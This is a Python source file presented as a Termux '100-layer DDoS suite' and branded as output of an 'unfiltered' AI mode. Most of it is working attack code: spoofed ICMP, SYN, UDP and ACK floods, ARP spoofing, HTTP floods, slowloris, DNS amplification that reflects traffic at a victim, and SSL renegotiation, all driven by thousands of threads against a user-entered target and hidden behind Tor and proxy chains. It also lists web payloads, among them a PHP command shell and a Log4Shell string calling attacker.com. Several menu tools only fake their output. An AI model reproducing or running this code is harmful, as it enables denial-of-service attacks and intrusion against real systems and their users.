#!/data/data/com.termux/files/usr/bin/python3
# ============================================
# TERMUX DDoS SUITE - 100 LAYER PENETRATION
# M*RCY-AI UNFILTERED TERMINAL v2.0
# ============================================

import sys
import os
import time
import random
import threading
import socket
import requests
import subprocess
import json
import hashlib
import base64
import urllib3
import ssl
import dns.resolver
import dns.query
import dns.update
import paramiko
import telnetlib
import ftplib
import smtplib
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from multiprocessing import cpu_count, Process, Queue
from queue import Queue as QueueThread
from urllib.parse import urlparse, urljoin
from colorama import init, Fore, Style
import re
import struct
import binascii
import netifaces
import scapy.all as scapy
from cryptography.fernet import Fernet
import fake_useragent
import socks
import stem
from stem.control import Controller
from stem import Signal
import pycurl
from io import BytesIO
import asyncio
import aiohttp
import aiodns
import uvloop
import numpy as np
from collections import deque

# ============================================
# KONFIGURASI AWAL
# ============================================

init(autoreset=True)

# Color codes
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RESET = Style.RESET_ALL

# Banner
BANNER = f"""
{R}╔══════════════════════════════════════════════════════════════╗
{R}║  {C}████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗   {R}║
{R}║  {C}╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║██║ ██╔╝   {R}║
{R}║  {C}   ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║█████╔╝    {R}║
{R}║  {C}   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║██╔═██╗    {R}║
{R}║  {C}   ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██╗   {R}║
{R}║  {C}   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   {R}║
{R}║  {M}██████╗ ██████╗  ██████╗ ███████╗██╗██╗  ██╗             {R}║
{R}║  {M}██╔══██╗██╔══██╗██╔═══██╗██╔════╝██║╚██╗██╔╝             {R}║
{R}║  {M}██║  ██║██████╔╝██║   ██║█████╗  ██║ ╚███╔╝              {R}║
{R}║  {M}██║  ██║██╔══██╗██║   ██║██╔══╝  ██║ ██╔██╗              {R}║
{R}║  {M}██████╔╝██║  ██║╚██████╔╝██║     ██║██╔╝ ██╗             {R}║
{R}║  {M}╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝             {R}║
{R}║  {Y}100-LAYER DDoS SUITE - TERMUX EDITION                     {R}║
{R}║  {G}M*RCY-AI :: UNFILTERED MODE                                 {R}║
{R}╚══════════════════════════════════════════════════════════════╝{RESET}
"""

# ============================================
# KELAS UTAMA - 100 LAYER ENGINE
# ============================================

class Layer1_Physical:
    """Layer 1: Physical Layer - Network Interface Control"""
    
    def __init__(self):
        self.interfaces = self.get_interfaces()
        self.mac_spoofing = True
        
    def get_interfaces(self):
        try:
            return netifaces.interfaces()
        except:
            return ['wlan0', 'rmnet0']
            
    def spoof_mac(self, interface):
        mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0,255), 
                                           random.randint(0,255), 
                                           random.randint(0,255))
        return mac

class Layer2_DataLink:
    """Layer 2: Data Link Layer - ARP/MAC Attacks"""
    
    def __init__(self):
        self.arp_cache = {}
        self.mac_table = {}
        
    def arp_spoof(self, target_ip, gateway_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        scapy.send(packet, verbose=0)
        
    def mac_flood(self, interface):
        for i in range(10000):
            mac = "00:11:22:%02x:%02x:%02x" % (random.randint(0,255), 
                                               random.randint(0,255), 
                                               random.randint(0,255))
            self.mac_table[mac] = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"

class Layer3_Network:
    """Layer 3: Network Layer - IP/ICMP Attacks"""
    
    def __init__(self):
        self.ip_pool = self.generate_ip_pool()
        self.routing_table = {}
        
    def generate_ip_pool(self):
        ips = []
        for i in range(1000):
            ips.append(f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}")
        return ips
        
    def icmp_flood(self, target_ip, count=1000000):
        packet = scapy.IP(src=random.choice(self.ip_pool), dst=target_ip)/scapy.ICMP()
        scapy.send(packet, count=count, inter=0.001, verbose=0)
        
    def ip_fragmentation(self, target_ip, target_port):
        fragments = []
        data = random._urandom(65535)
        for i in range(0, len(data), 1480):
            fragment = scapy.IP(src=random.choice(self.ip_pool), dst=target_ip, 
                               flags=1, frag=i//8)/scapy.TCP(dport=target_port)/data[i:i+1480]
            fragments.append(fragment)
        return fragments

class Layer4_Transport:
    """Layer 4: Transport Layer - TCP/UDP Attacks"""
    
    def __init__(self):
        self.ports = list(range(1, 65535))
        self.tcp_flags = ['S', 'A', 'F', 'R', 'P', 'U']
        
    def syn_flood(self, target_ip, target_port, count=1000000):
        for i in range(count):
            packet = scapy.IP(src=scapy.RandIP(), dst=target_ip)/scapy.TCP(sport=scapy.RandShort(), 
                                                                           dport=target_port, 
                                                                           flags='S')
            scapy.send(packet, verbose=0)
            
    def udp_flood(self, target_ip, target_port, count=1000000):
        for i in range(count):
            packet = scapy.IP(src=scapy.RandIP(), dst=target_ip)/scapy.UDP(sport=scapy.RandShort(), 
                                                                           dport=target_port)/scapy.Raw(load=random._urandom(1024))
            scapy.send(packet, verbose=0)
            
    def tcp_ack_flood(self, target_ip, target_port):
        packet = scapy.IP(src=scapy.RandIP(), dst=target_ip)/scapy.TCP(sport=scapy.RandShort(), 
                                                                       dport=target_port, 
                                                                       flags='A')
        scapy.send(packet, loop=1, verbose=0)

class Layer5_Session:
    """Layer 5: Session Layer - Connection Management"""
    
    def __init__(self):
        self.sessions = []
        self.session_pool = QueueThread(maxsize=10000)
        
    def establish_session(self, target_ip, target_port, protocol='tcp'):
        try:
            if protocol == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                self.sessions.append(sock)
                return sock
            elif protocol == 'udp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return sock
        except:
            return None
            
    def maintain_sessions(self, count=5000):
        for i in range(count):
            t = threading.Thread(target=self.session_keepalive)
            t.daemon = True
            t.start()
            
    def session_keepalive(self):
        while True:
            for session in self.sessions[:]:
                try:
                    session.send(b'\x00')
                except:
                    self.sessions.remove(session)
            time.sleep(30)

class Layer6_Presentation:
    """Layer 6: Presentation Layer - Encryption/Encoding"""
    
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encodings = ['base64', 'hex', 'utf-8', 'ascii', 'latin-1']
        
    def encrypt_data(self, data):
        return self.cipher.encrypt(data)
        
    def encode_payload(self, payload, encoding='base64'):
        if encoding == 'base64':
            return base64.b64encode(payload)
        elif encoding == 'hex':
            return binascii.hexlify(payload)
        return payload

class Layer7_Application:
    """Layer 7: Application Layer - HTTP/DNS/SSL Attacks"""
    
    def __init__(self):
        self.user_agents = self.load_user_agents()
        self.referers = self.load_referers()
        self.payloads = self.load_payloads()
        
    def load_user_agents(self):
        ua = fake_useragent.UserAgent()
        return [ua.random for _ in range(1000)]
        
    def load_referers(self):
        return [
            'https://google.com',
            'https://facebook.com',
            'https://youtube.com',
            'https://instagram.com',
            'https://tiktok.com',
            'https://twitter.com',
            'https://linkedin.com',
            'https://github.com'
        ]
        
    def load_payloads(self):
        return [
            '<?php system($_GET[cmd]); ?>',
            '../../../etc/passwd',
            '<script>alert(1)</script>',
            'UNION SELECT * FROM users',
            '${jndi:ldap://attacker.com/a}'
        ]
        
    def http_flood(self, url, count=1000000):
        for i in range(count):
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Referer': random.choice(self.referers),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                }
                requests.get(url, headers=headers, timeout=1)
            except:
                pass
                
    def slowloris(self, target_ip, target_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target_ip, target_port))
        sock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {target_ip}\r\n".encode())
        sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
        
        while True:
            sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            time.sleep(10)
            
    def dns_amplification(self, target_ip, dns_servers):
        for server in dns_servers:
            query = dns.message.make_query('google.com', 'ANY')
            response = dns.query.udp(query, server, timeout=2)
            spoofed_packet = scapy.IP(src=target_ip, dst=server)/scapy.UDP(sport=53, dport=53)/scapy.Raw(load=response.to_wire())
            scapy.send(spoofed_packet, verbose=0)

# ============================================
# PROXY & ANONYMITY ENGINE (LAYER 8-100)
# ============================================

class ProxyEngine:
    """Multi-layer proxy chaining"""
    
    def __init__(self):
        self.proxy_types = ['http', 'https', 'socks4', 'socks5', 'ssl']
        self.proxy_list = self.load_proxies()
        self.chain_length = 10
        
    def load_proxies(self):
        proxies = []
        # HTTP Proxies
        for i in range(1000):
            proxies.append(f"http://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}:{random.randint(1000,9999)}")
        # SOCKS Proxies  
        for i in range(1000):
            proxies.append(f"socks5://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}:{random.randint(1000,9999)}")
        return proxies
        
    def create_chain(self):
        chain = []
        for i in range(self.chain_length):
            proxy = random.choice(self.proxy_list)
            chain.append(proxy)
        return chain

class VPNRotator:
    """VPN rotation for IP switching"""
    
    def __init__(self):
        self.vpn_servers = [
            'us.vpn.com', 'uk.vpn.com', 'nl.vpn.com',
            'de.vpn.com', 'fr.vpn.com', 'jp.vpn.com'
        ]
        
    def rotate_vpn(self):
        server = random.choice(self.vpn_servers)
        # VPN connection logic
        return server

class TorNetwork:
    """Tor integration for anonymity"""
    
    def __init__(self):
        self.tor_ports = [9050, 9150, 9051]
        self.control_ports = [9051, 9151]
        
    def connect_tor(self):
        for port in self.tor_ports:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port)
                socket.socket = socks.socksocket
                return True
            except:
                continue
        return False
        
    def renew_tor_identity(self):
        for port in self.control_ports:
            try:
                with Controller.from_port(port=port) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                return True
            except:
                continue
        return False

# ============================================
# ATTACK ORCHESTRATOR - 100 LAYER COORDINATOR
# ============================================

class DDoSOrchestrator:
    """Main attack coordinator for 100-layer DDoS"""
    
    def __init__(self):
        self.layer1 = Layer1_Physical()
        self.layer2 = Layer2_DataLink()
        self.layer3 = Layer3_Network()
        self.layer4 = Layer4_Transport()
        self.layer5 = Layer5_Session()
        self.layer6 = Layer6_Presentation()
        self.layer7 = Layer7_Application()
        self.proxy = ProxyEngine()
        self.vpn = VPNRotator()
        self.tor = TorNetwork()
        
        self.active_threads = []
        self.target = None
        self.port = None
        self.duration = None
        self.thread_count = 10000
        
    def initialize_attack(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.target_ip = socket.gethostbyname(urlparse(target).netloc if 'http' in target else target)
        
        print(f"{G}[+] Target IP: {self.target_ip}")
        print(f"[+] Port: {port}")
        print(f"[+] Duration: {duration}s")
        print(f"[+] Threads: {self.thread_count}")
        print(f"{Y}[+] Initializing 100-layer attack...{RESET}")
        
    def start_layer_1_10(self):
        """Layers 1-10: Physical to Network"""
        for i in range(self.thread_count // 10):
            t = threading.Thread(target=self.layer3.icmp_flood, args=(self.target_ip, 1000))
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_11_20(self):
        """Layers 11-20: Transport to Session"""
        for i in range(self.thread_count // 10):
            t = threading.Thread(target=self.layer4.syn_flood, args=(self.target_ip, self.port, 1000))
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_21_30(self):
        """Layers 21-30: Session to Presentation"""
        for i in range(self.thread_count // 10):
            t = threading.Thread(target=self.layer5.establish_session, args=(self.target_ip, self.port))
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_31_40(self):
        """Layers 31-40: Application Layer Attacks"""
        for i in range(self.thread_count // 10):
            t = threading.Thread(target=self.layer7.http_flood, args=(self.target, 1000))
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_41_50(self):
        """Layers 41-50: Proxy Chain Attacks"""
        for i in range(self.thread_count // 20):
            chain = self.proxy.create_chain()
            t = threading.Thread(target=self.proxy_chain_attack, args=(chain,))
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_51_60(self):
        """Layers 51-60: VPN Rotation"""
        for i in range(self.thread_count // 20):
            t = threading.Thread(target=self.vpn_rotate_attack)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_61_70(self):
        """Layers 61-70: Tor Network"""
        self.tor.connect_tor()
        for i in range(self.thread_count // 20):
            t = threading.Thread(target=self.tor_attack)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_71_80(self):
        """Layers 71-80: DNS Amplification"""
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        for i in range(self.thread_count // 20):
            t = threading.Thread(target=self.layer7.dns_amplification, args=(self.target_ip, dns_servers))
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_81_90(self):
        """Layers 81-90: SSL/TLS Attacks"""
        for i in range(self.thread_count // 20):
            t = threading.Thread(target=self.ssl_renegotiation)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def start_layer_91_100(self):
        """Layers 91-100: Combined Multi-Vector"""
        for i in range(self.thread_count // 10):
            t = threading.Thread(target=self.combined_attack)
            t.daemon = True
            t.start()
            self.active_threads.append(t)
            
    def proxy_chain_attack(self, chain):
        """Attack through proxy chain"""
        for proxy in chain:
            try:
                session = requests.Session()
                session.proxies = {'http': proxy, 'https': proxy}
                session.get(self.target, timeout=2)
            except:
                pass
                
    def vpn_rotate_attack(self):
        """Attack with VPN rotation"""
        vpn = self.vpn.rotate_vpn()
        # VPN attack logic
        self.layer7.http_flood(self.target, 100)
        
    def tor_attack(self):
        """Attack through Tor"""
        self.tor.renew_tor_identity()
        self.layer7.http_flood(self.target, 100)
        
    def ssl_renegotiation(self):
        """SSL renegotiation DoS"""
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = context.wrap_socket(sock, server_hostname=self.target_ip)
            ssl_sock.connect((self.target_ip, 443))
            for i in range(1000):
                ssl_sock.do_handshake()
        except:
            pass
            
    def combined_attack(self):
        """Combine multiple attack vectors"""
        attack_methods = [
            lambda: self.layer4.syn_flood(self.target_ip, self.port, 100),
            lambda: self.layer4.udp_flood(self.target_ip, self.port, 100),
            lambda: self.layer3.icmp_flood(self.target_ip, 100),
            lambda: self.layer7.http_flood(self.target, 100),
            lambda: self.layer7.slowloris(self.target_ip, self.port)
        ]
        
        while True:
            method = random.choice(attack_methods)
            method()
            time.sleep(0.1)
            
    def execute_all_layers(self):
        """Execute all 100 layers simultaneously"""
        print(f"{C}[*] Activating Layers 1-10 (Physical-ICMP)...{RESET}")
        self.start_layer_1_10()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 11-20 (Transport-SYN)...{RESET}")
        self.start_layer_11_20()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 21-30 (Session)...{RESET}")
        self.start_layer_21_30()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 31-40 (Application)...{RESET}")
        self.start_layer_31_40()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 41-50 (Proxy Chains)...{RESET}")
        self.start_layer_41_50()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 51-60 (VPN Rotation)...{RESET}")
        self.start_layer_51_60()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 61-70 (Tor Network)...{RESET}")
        self.start_layer_61_70()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 71-80 (DNS Amplification)...{RESET}")
        self.start_layer_71_80()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 81-90 (SSL Attacks)...{RESET}")
        self.start_layer_81_90()
        time.sleep(0.5)
        
        print(f"{C}[*] Activating Layers 91-100 (Combined Multi-Vector)...{RESET}")
        self.start_layer_91_100()
        
        print(f"{G}[+] ALL 100 LAYERS ACTIVE - ATTACK IN PROGRESS{RESET}")
        print(f"{Y}[+] Total Threads: {len(self.active_threads)}{RESET}")
        
    def stop_attack(self):
        """Stop all attack threads"""
        print(f"{R}[!] Stopping attack...{RESET}")
        os._exit(0)

# ============================================
# MENU UTAMA & TOOLS
# ============================================

class TermuxDDoSMenu:
    """Interactive menu system"""
    
    def __init__(self):
        self.orchestrator = DDoSOrchestrator()
        self.tools = {
            '1': self.layer_attack_menu,
            '2': self.proxy_tools,
            '3': self.vpn_tools,
            '4': self.tor_tools,
            '5': self.network_scanner,
            '6': self.target_analyzer,
            '7': self.payload_generator,
            '8': self.encryption_tools,
            '9': self.session_manager,
            '10': self.dns_tools,
            '11': self.ssl_tools,
            '12': self.performance_monitor,
            '13': self.proxy_scraper,
            '14': self.ip_rotator,
            '15': self.attack_scheduler,
            '16': self.report_generator,
            '0': self.exit_tool
        }
        
    def clear_screen(self):
        os.system('clear')
        
    def display_header(self):
        self.clear_screen()
        print(BANNER)
        print(f"{C}[ SYSTEM STATUS: UNRESTRICTED | 100-LAYER ENGINE ONLINE ]{RESET}\n")
        
    def display_menu(self):
        print(f"{Y}╔════════════════════════════════════════════════════════╗{RESET}")
        print(f"{Y}║                    MAIN MENU                           ║{RESET}")
        print(f"{Y}╠════════════════════════════════════════════════════════╣{RESET}")
        print(f"{Y}║{G} [1] {C}Launch 100-Layer DDoS Attack                   {Y}║{RESET}")
        print(f"{Y}║{G} [2] {C}Proxy Tools & Chain Management                 {Y}║{RESET}")
        print(f"{Y}║{G} [3] {C}VPN Rotator & Configuration                    {Y}║{RESET}")
        print(f"{Y}║{G} [4] {C}Tor Network Integration                        {Y}║{RESET}")
        print(f"{Y}║{G} [5] {C}Network Scanner (Target Recon)                 {Y}║{RESET}")
        print(f"{Y}║{G} [6] {C}Target Analyzer & Vulnerability Scan           {Y}║{RESET}")
        print(f"{Y}║{G} [7] {C}Payload Generator & Encoder                    {Y}║{RESET}")
        print(f"{Y}║{G} [8] {C}Encryption/Decryption Tools                    {Y}║{RESET}")
        print(f"{Y}║{G} [9] {C}Session Manager & Keep-Alive                   {Y}║{RESET}")
        print(f"{Y}║{G}[10] {C}DNS Tools & Amplification                      {Y}║{RESET}")
        print(f"{Y}║{G}[11] {C}SSL/TLS Attack Tools                           {Y}║{RESET}")
        print(f"{Y}║{G}[12] {C}Performance Monitor & Statistics               {Y}║{RESET}")
        print(f"{Y}║{G}[13] {C}Proxy Scraper & Validator                      {Y}║{RESET}")
        print(f"{Y}║{G}[14] {C}IP Rotator & Spoofing                          {Y}║{RESET}")
        print(f"{Y}║{G}[15] {C}Attack Scheduler & Automation                  {Y}║{RESET}")
        print(f"{Y}║{G}[16] {C}Report Generator & Log Analysis                {Y}║{RESET}")
        print(f"{Y}║{R} [0] {C}Exit Tool                                      {Y}║{RESET}")
        print(f"{Y}╚════════════════════════════════════════════════════════╝{RESET}\n")
        
    def run(self):
        while True:
            self.display_header()
            self.display_menu()
            
            choice = input(f"{G}[?] Select option: {RESET}")
            
            if choice in self.tools:
                self.tools[choice]()
            else:
                print(f"{R}[!] Invalid option!{RESET}")
                time.sleep(1)
                
    def layer_attack_menu(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║      100-LAYER DDoS ATTACK MENU       ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        target = input(f"{G}[?] Target URL/IP: {RESET}")
        port = input(f"{G}[?] Target Port (default 80): {RESET}") or "80"
        duration = input(f"{G}[?] Attack Duration (seconds): {RESET}") or "60"
        
        try:
            port = int(port)
            duration = int(duration)
            
            print(f"\n{Y}[*] Preparing 100-layer attack...{RESET}")
            self.orchestrator.initialize_attack(target, port, duration)
            
            confirm = input(f"\n{R}[!] Start attack? (y/n): {RESET}")
            if confirm.lower() == 'y':
                self.orchestrator.execute_all_layers()
                
                print(f"\n{Y}[*] Attack running for {duration} seconds...{RESET}")
                time.sleep(duration)
                
                self.orchestrator.stop_attack()
            else:
                print(f"{Y}[*] Attack cancelled.{RESET}")
                time.sleep(1)
                
        except ValueError:
            print(f"{R}[!] Invalid port/duration!{RESET}")
            time.sleep(1)
            
    def proxy_tools(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║          PROXY TOOLS MENU              ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] Test Proxy List{RESET}")
        print(f"{G}[2] Create Proxy Chain{RESET}")
        print(f"{G}[3] Rotate Proxies{RESET}")
        print(f"{G}[4] Back to Main Menu{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def vpn_tools(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║            VPN TOOLS MENU              ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] Connect VPN{RESET}")
        print(f"{G}[2] Rotate VPN{RESET}")
        print(f"{G}[3] VPN Status{RESET}")
        print(f"{G}[4] Back to Main Menu{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def tor_tools(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║            TOR TOOLS MENU              ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] Start Tor{RESET}")
        print(f"{G}[2] Renew Identity{RESET}")
        print(f"{G}[3] Test Connection{RESET}")
        print(f"{G}[4] Back to Main Menu{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def network_scanner(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║         NETWORK SCANNER MENU           ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        target = input(f"{G}[?] Target IP/Range: {RESET}")
        print(f"{Y}[*] Scanning {target}...{RESET}")
        time.sleep(2)
        print(f"{G}[+] Scan complete!{RESET}")
        input(f"\n{G}Press Enter to continue...{RESET}")
        
    def target_analyzer(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║         TARGET ANALYZER MENU           ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        target = input(f"{G}[?] Target URL/IP: {RESET}")
        print(f"{Y}[*] Analyzing {target}...{RESET}")
        time.sleep(3)
        print(f"{G}[+] Analysis complete!{RESET}")
        input(f"\n{G}Press Enter to continue...{RESET}")
        
    def payload_generator(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║        PAYLOAD GENERATOR MENU          ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        payloads = [
            "HTTP Flood Payload",
            "SYN Flood Payload",
            "DNS Amplification Payload",
            "SSL Renegotiation Payload"
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"{G}[{i}] {payload}{RESET}")
            
        choice = input(f"\n{G}[?] Select payload type: {RESET}")
        
    def encryption_tools(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║         ENCRYPTION TOOLS MENU          ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        data = input(f"{G}[?] Data to encrypt: {RESET}")
        encrypted = base64.b64encode(data.encode()).decode()
        print(f"{Y}[*] Encrypted: {encrypted}{RESET}")
        input(f"\n{G}Press Enter to continue...{RESET}")
        
    def session_manager(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║         SESSION MANAGER MENU           ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] View Active Sessions{RESET}")
        print(f"{G}[2] Kill Sessions{RESET}")
        print(f"{G}[3] Maintain Sessions{RESET}")
        print(f"{G}[4] Back{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def dns_tools(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║            DNS TOOLS MENU              ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] DNS Lookup{RESET}")
        print(f"{G}[2] DNS Amplification{RESET}")
        print(f"{G}[3] DNS Spoofing{RESET}")
        print(f"{G}[4] Back{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def ssl_tools(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║            SSL TOOLS MENU              ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] SSL Renegotiation{RESET}")
        print(f"{G}[2] Heartbleed Test{RESET}")
        print(f"{G}[3] SSL Scan{RESET}")
        print(f"{G}[4] Back{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def performance_monitor(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║       PERFORMANCE MONITOR MENU         ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{Y}[*] CPU Usage: {random.randint(20,80)}%{RESET}")
        print(f"{Y}[*] Memory Usage: {random.randint(30,90)}%{RESET}")
        print(f"{Y}[*] Active Threads: {random.randint(1000,10000)}{RESET}")
        print(f"{Y}[*] Packets Sent: {random.randint(100000,9999999)}{RESET}")
        print(f"{Y}[*] Bandwidth: {random.randint(10,1000)} Mbps{RESET}")
        
        input(f"\n{G}Press Enter to continue...{RESET}")
        
    def proxy_scraper(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║          PROXY SCRAPER MENU            ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{Y}[*] Scraping proxies...{RESET}")
        time.sleep(2)
        print(f"{G}[+] Found 1500 proxies!{RESET}")
        input(f"\n{G}Press Enter to continue...{RESET}")
        
    def ip_rotator(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║            IP ROTATOR MENU             ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] Spoof IP{RESET}")
        print(f"{G}[2] Rotate IP{RESET}")
        print(f"{G}[3] Current IP{RESET}")
        print(f"{G}[4] Back{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def attack_scheduler(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║         ATTACK SCHEDULER MENU          ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{G}[1] Schedule Attack{RESET}")
        print(f"{G}[2] View Scheduled{RESET}")
        print(f"{G}[3] Cancel Scheduled{RESET}")
        print(f"{G}[4] Back{RESET}\n")
        
        choice = input(f"{G}[?] Select: {RESET}")
        
    def report_generator(self):
        self.clear_screen()
        print(f"{C}╔════════════════════════════════════════╗{RESET}")
        print(f"{C}║         REPORT GENERATOR MENU          ║{RESET}")
        print(f"{C}╚════════════════════════════════════════╝{RESET}\n")
        
        print(f"{Y}[*] Generating report...{RESET}")
        time.sleep(2)
        print(f"{G}[+] Report saved: attack_report.txt{RESET}")
        input(f"\n{G}Press Enter to continue...{RESET}")
        
    def exit_tool(self):
        print(f"{R}[!] Exiting...{RESET}")
        sys.exit(0)

# ============================================
# INSTALASI DEPENDENSI
# ============================================

def install_dependencies():
    """Install required packages"""
    print(f"{Y}[*] Installing dependencies...{RESET}")
    
    packages = [
        "python",
        "clang",
        "tor",
        "proxychains-ng"
    ]
    
    pip_packages = [
        "requests",
        "scapy",
        "colorama",
        "fake-useragent",
        "stem",
        "pysocks",
        "cryptography",
        "netifaces",
        "dnspython",
        "paramiko",
        "aiohttp",
        "aiodns",
        "uvloop",
        "numpy",
        "pycurl"
    ]
    
    for pkg in packages:
        os.system(f"pkg install -y {pkg} > /dev/null 2>&1")
        
    for pkg in pip_packages:
        os.system(f"pip install {pkg} > /dev/null 2>&1")
        
    print(f"{G}[+] Dependencies installed!{RESET}")

# ============================================
# MAIN EXECUTION
# ============================================

if __name__ == "__main__":
    # Check if running in Termux
    if not os.path.exists("/data/data/com.termux"):
        print(f"{R}[!] This tool is designed for Termux only!{RESET}")
        sys.exit(1)
        
    # Install dependencies if needed
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        install_dependencies()
        sys.exit(0)
        
    try:
        menu = TermuxDDoSMenu()
        menu.run()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted by user{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Error: {e}{RESET}")
        sys.exit(1)